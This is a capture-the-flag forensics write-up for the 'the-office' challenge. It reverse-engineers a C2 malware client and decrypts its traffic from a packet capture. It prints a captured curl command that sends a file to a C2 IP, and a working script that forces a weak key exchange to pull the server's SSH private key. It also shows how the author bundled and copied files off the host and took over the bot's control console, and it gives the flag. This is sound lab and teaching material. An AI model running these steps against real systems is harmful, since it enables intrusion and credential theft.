# the-office

[library.m0unt41n.ch/challenges/the-office](https://library.m0unt41n.ch/challenges/the-office) ![](../../resources/forensics.svg) ![](../../resources/hard.svg) 

# TL;DR

> _The office's main computer had been hacked, communicating with an unknown_
> _C2 server, and for reasons beyond comprehension, Gary was tasked with unraveling_
> _this digital conundrum. (Gary is the finance guy)_
>
> Hint:_This is a extreme parcour multi skill challenge make sure you understand_
> _where the flag is located_<br>
> Hint:_Sometimes bruteforce is the solution (or at least part of it)_<br>
> Hint:_172.105.87.133 was a C2 server obviously_

We get two endpoints:

*   HTTP: `https://3a688a48-6c22-4f5e-b495-eaa4164999c8.library.m0unt41n.ch:31337` -
    but trying it out results in a 404 all the time.
*   SSH: `ssh library.m0unt41n.ch -p 32405` - but we have no user/password or
    a SSH key.

A really fun multi-step challenge!

# Analysis

First, what data we have in the package:

```
├── capture_file.pcap
├── docker-compose.yaml
├── server
│   ├── Dockerfile
│   └── start.sh
└── victim
    ├── Dockerfile
    ├── flag.txt
    └── src
        └── client
```

From looking at the Dockerfiles it is clear that the package is not complete.
We likely have to pull remaining pieces as part of solving it. In the meantime,
let's look at what we have.

## `client` binary

I just couldn't resist and fully decompiled it &#128512; (up to the point that
it can be actually built back!). See: [client.c](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/forensics/the-office/client.c).

This looks like "malware" executable that periodically connects to `web:8000`,
polls for commands to run, executes them and sends back the results. All that
using a simple API:

Initialization phase:

*   `GET /gen_keys` - returning a JSON with following contents:
    *   `client_id`: hex string, used in any further communication
    *   `g`, `A` and `p`: keys for a simple Diffie-Hellman-alike shared
        secret. The client picks a random `exp`, then calculates:
        *   `b = g^exp mod p`
        *   `shared_key = A^e mod p`
*   `POST /recv_keys` - sends `b` to the server, together with `client_id`.
    Server can reconstruct `shared_key` and that will be used for
    encrypting the strings from now on. The encryption is a simple XOR.

Then, in a loop, calling `recv_and_execute_command()`:

*   `POST /recv` - receive a command. The server returns:
    `{"client_id": "xxxxxx", "encrypted_command": "base64string"}`
*   `POST /send` - send the encrypted execution result, as
    `{"client_id": "xxxxxx", "data": "base64string"}`

There is some safety logic, e.g. avoiding executing the same command twice
and overall good memory handling. All that written using a hefty amount of
[cJSON](https://github.com/DaveGamble/cJSON),
[libcurl](https://curl.se/libcurl/) and
[OpenSSL BIO](https://wiki.openssl.org/index.php/BIO) libraries &#128578;

## `capture_file.pcap`

The provided packet capture reflects above API quite well. It starts with
the `/gen_keys` exchange (with `client_id=a483f845454b5147`, `A=350`,
`g=547` and `p=827`), sends back `B=322` via `/recv_keys` and then,
executes a sequence of enxrypted commands.

With these numbers, we can calculate `shared_key` that was used for this
exchange:

```python
A = 350
g = 547
p = 827
B = 322

for exp in range(p):
    if pow(g, exp, p) == B:
        print(pow(A, exp, p))
```

`shared_key` is **73**. With that, I wrote a [parse_pcap.py](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/forensics/the-office/parse_pcap.py)
script to make it easier to look at the dump:

```python
import subprocess
import json
import re
import base64

SHARED_KEY=73

tshark = subprocess.run(['tshark', '-r', 'capture_file.pcap', '-T', 'json'],
                        capture_output=True, text=True, check=True)
for pkt in json.loads(tshark.stdout):
    if 'http' in pkt['_source']['layers']:
        http = pkt['_source']['layers']['http']
        for req in http.keys():
            req = req.split(' ')
            if req[0] in ['GET', 'POST']:
                print('\033[1;32m'+req[0]+' \033[1;34m'+req[1]+'\033[0m ', end='')
            elif req[0].startswith('HTTP'):
                print('  \033[1;33mOK\033[0m ', end='')
        if 'http.file_data' in http:
            data = http['http.file_data'].replace(':', '')
            data = bytes.fromhex(data).decode('utf-8')
            try:
                data = json.loads(data)
                for key in ['encrypted_command', 'data']:
                    if key in data:
                        data[key] = ''.join(chr(c^SHARED_KEY) for c in base64.b64decode(data[key]))
                print(data)
            except:
                print(data)
```

With that, we can follow the conversation that happened:

```bash
$ echo hello
hello
$ hostname
2bc7bf2ba58a
$ echo "cant stop me from shitposting!"
cant stop me from shitposting!
$ echo "Monika why dont you print the excel file in A1 format?"
Monika why dont you print the excel file in A1 format?
$ curl http://172.105.87.133:8000/files -H "Content-Type: application/json" -X POST --data '{"client_id": "a483f845454b5147", "shared_key": "73", "path": "/root/requirements.txt"}'
$ touch bad.txt
$ ./rick_roll
$ exit
```

So, there is an additional `POST /files` endpoint - possibly a **very** useful one! &#128578;

# Hacking it

## Getting a shell

In `server/Dockerfile` we have:

```Dockerfile
RUN mkdir /root/.ssh && \
    ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -q -N "" && \
    cp /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys
```

In order to get these keys we need to replicate the above dialog, including
getting a fresh `client_id` and key exchange. At first, I did something like:

```python
resp = requests.get(SERVER+"/gen_keys")
j = json.loads(resp.text)
client_id = j["client_id"]
exp = random.randint(0, j["p"]-1)
B = pow(j["g"], exp, j["p"])
shared_key = pow(j["A"], exp, j["p"])
```

... but then, I realized none of that is actually needed. We control `exp` and can set it
to zero - which will result in both `B` and `shared_key` being set to `1`. With that,
[get_keys.py](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/forensics/the-office/get_keys.py):

```python
import json
import os
import random
import requests

SERVER = "https://adaea8da-3295-4851-acb8-8d8ee2107792.library.m0unt41n.ch:31337"

resp = requests.get(SERVER+"/gen_keys")
j = json.loads(resp.text)
client_id = j["client_id"]
requests.post(
    SERVER+"/recv_keys",
    headers={"Content-Type": "application/json"},
    json={
        "client_id": client_id,
        "B": 1,
    })

resp = requests.post(
    SERVER+"/files",
    headers={"Content-Type": "application/json"},
    json={
        "client_id": client_id,
        "shared_key": 1,
        "path": "/root/.ssh/id_rsa"
    })
open("chall_key", "w").write(resp.text)
os.chmod("chall_key", 0o600)
```

With that:

```
$ ssh -p 31819 -i chall_key root@library.m0unt41n.ch
The authenticity of host '[library.m0unt41n.ch]:31819 ([128.140.62.133]:31819)' can't be established.
ED25519 key fingerprint is SHA256:TdDE1kHUXTqX8LrEi2Bvimk4u+/WNGYk38GNnzr9abY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[library.m0unt41n.ch]:31819' (ED25519) to the list of known hosts.
Linux web 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Dec 27 15:37:22 2024 from 10.42.0.63
root@web:~#
```

## Looking around and getting the flag

Seems like the missing pieces (`server.py`, `requirements.txt`) are there.
For simplicity, grabbing files newer than 365 days seems to be doing the job:

```bash
cd /
EXCEPT='^/(dev|sys|proc|run|usr/local/lib/python3.8|root/.cache/pip|var/lib/dpkg|var/lib/apt|var/cache/debconf|exfil)'
find / -mtime -365 -type f 2>/dev/null | grep -Ev $EXCEPT >/exfil.txt
tar czCf / /exfil.tar.gz /exfil.txt $(cat exfil.txt)
```

And getting it back to local machine:

```bash
scp -P 31819 -i chall_key root@library.m0unt41n.ch:/exfil.tar.gz .
```

But, before we go on analyzing the server code, some more look:

```
# pstree -alp
start.sh,1 ./start.sh
  |-sshd,13 -D
  |   `-sshd,797    
  |       `-bash,803
  |           `-pstree,809 -alp
  `-tmux: server,10 new-session -d -s websession exec python ./server.py
      `-python,11 ./server.py
          `-{python},16

$ tmux list-sessions
websession: 1 windows (created Fri Dec 27 15:28:39 2024) [80x24]

$ tmux detach -s websession
no current client

$ tmux attach-session -t websession
...
```

...aaaaand, **we are in the C&C console of the bot!**. From here, it is simple:

```log
Enter command: cat /app/flag.txt
Executing: cat /app/flag.txt
(...)
10.42.0.246 - - [27/Dec/2024 15:43:14] "POST /recv HTTP/1.1" 200 -
Received data: b'shc2024{pwn_th3_4PT_1s_1338}'
```

# Reproducing it locally

With two missing files added and some minor tweaks:

```bash 
chmod a+x server/start.sh
sed -i 's/22:22/2222:22/' docker-compose.yaml
docker compose build && docker compose up
```

... all this is perfectly reproducible in the local Docker environment &#128578;

---

## `shc2024{pwn_th3_4PT_1s_1338}`



<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
